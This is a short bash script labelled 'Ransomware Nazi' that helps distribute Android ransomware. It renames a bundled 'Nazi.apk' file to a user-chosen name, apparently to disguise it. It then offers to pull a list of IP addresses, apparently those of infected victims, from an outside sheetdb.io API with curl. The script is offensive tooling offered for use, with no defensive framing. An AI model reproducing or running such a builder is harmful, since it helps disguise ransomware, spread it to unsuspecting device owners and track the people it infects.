echo -e "\033[93m Ransomware Nazi"
read -p "Enter name APK > " app
mv "Nazi.apk" $app.apk
echo -e "\033[92m name file changed... ;D\033[93m"
read -p "show IPs Y/N > " text
if echo "$text" | grep -q "Y"; then
ip=$(curl -s 'https://sheetdb.io/api/v1/9k4t6tfssbyud' | jq --raw-output '.[] | .ip')
echo -e "\033[92m IP:"
echo -e "${ip}"
elif echo "$text" | grep -q "N"; then
echo -e "\033[92m Bye... ^_+"
else
echo -e "\033[91m Error!"
fi
